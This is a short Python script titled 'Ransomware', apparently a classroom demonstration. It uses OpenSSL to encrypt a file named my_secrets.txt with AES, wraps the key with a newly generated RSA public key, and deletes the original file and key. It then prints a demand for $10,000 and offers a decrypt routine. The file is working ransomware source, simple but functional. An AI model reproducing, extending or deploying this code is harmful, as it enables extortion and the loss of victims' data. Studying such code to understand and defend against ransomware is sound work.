# Ransomware 
#
# 
#
# ransomware.py


import os
import subprocess
import base64


def encryptFiles():
	# Generate a symmetric key and save it to a file named 'key.txt'
	process = subprocess.run(["openssl", "rand", "-base64", "-out", "key.txt", "16"], check=True)
	
	# Generate a random iv
	process = subprocess.run(["openssl", "rand", "-hex", "-out", "iv.txt", "16"], check=True)
	
	# Generate a public/private key pair for attacker
	process = subprocess.run(["openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", \
				"rsa_keygen_bits:1024", "-out", "rsaKeyPair.pem"], check=True)
	
	# Get the public key from the key-pair
	process = subprocess.run(["openssl", "pkey", "-pubout", "-in", "rsaKeyPair.pem", \
					"-out", "rsaPubKey.pem"], check=True)
	
	

	# Convert base64 format to hex to use the symmetric key
	with open("key.txt", "r") as file:
		key_b64 = file.read().strip()
	
	key_bytes = base64.b64decode(key_b64)
	key_hex = key_bytes.hex()
	
	# Read IV
	with open("iv.txt", 'r') as file:
		iv_hex = file.read().strip()
	
	
	# Encrypt 'my_secrets.txt' using symmetric key
	
	process = subprocess.run(["openssl", "enc", "-e", "-aes-128-ctr", "-a", \
					"-in", "my_secrets.txt", "-out", "data_cipher.txt", 
						"-K", key_hex, "-iv", iv_hex], check=True)	
	
	
	# Encrypt the symmetric key (key.txt) and using the public key
	process = subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-in", "key.txt",\
			 		"-inkey", "rsaPubKey.pem", "-out", "key_cipher.bin"],\
			 		 	check=True)
	# Encode the key_cipher binary to .txt format
	process = subprocess.run(["openssl", "base64", "-in", "key_cipher.bin", \
					"-out", "key_cipher.txt"], check=True)			
	
	
	# Delete key.txt and my_secrets.txt
	os.remove("my_secrets.txt")
	os.remove("key.txt")
	# Delete other uneccesary files
	os.remove("key_cipher.bin")
	
	
	# Success message
	print("Your file my_secrets.txt is ecrypted. To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me")
	
	return




def decryptFiles():
	# Decode the key_cipher.txt to binary
	process = subprocess.run(["openssl", "base64", "-d", "-in", "key_cipher.txt", "-out",\
					"key_cipher.bin"], check=True)
	
	#os.remove("key_cipher.txt")


	# Decrypt key_cipher.bin using the private key to get the symmetric key (key.txt)
	process = subprocess.run(["openssl", "pkeyutl", "-decrypt", "-in", "key_cipher.bin",\
			 		"-inkey", "rsaKeyPair.pem", "-out", "key.txt"],\
			 		 	check=True)
	
	#os.remove("key_cipher.bin")'	 	
	
	
	# Convert symmetric key to hex format
	with open("key.txt", "r") as file:
		key_b64 = file.read().strip()
		
	# Read IV
	with open("iv.txt", 'r') as file:
		iv_hex = file.read().strip()
	
	key_bytes = base64.b64decode(key_b64)
	key_hex = key_bytes.hex()
	
	
	# Decrypt the data_cipher.txt using the symmetric key (key.txt)
	process = subprocess.run(["openssl", "enc", "-d", "-aes-128-ctr", "-a", \
					"-in", "data_cipher.txt", "-out", "my_secrets.txt", 
						"-K", key_hex, "-iv", iv_hex], check=True)
	

	# Housekeeping
	'''
	os.remove("data_cipher.txt")
	os.remove("key.txt")
	os.remove("iv.txt")
	os.remove("rsaPubKey.pem")
	os.remove("rsaKeyPair.pem")
	'''
	
	
	return
	



def main():
	# Begin encryption
	print("Encrypting files...\n")
	
	encryptFiles()
	print()
	
	
	# Choice to decrypt
	decrypt = False
	while not decrypt:
		decision = input("Pay and decrypt now (y/n): ")
		print()
		
		if decision == 'y':
			decrypt = True
			decryptFiles()
	
	return
	
	
	
	
if __name__ == "__main__":
	main()
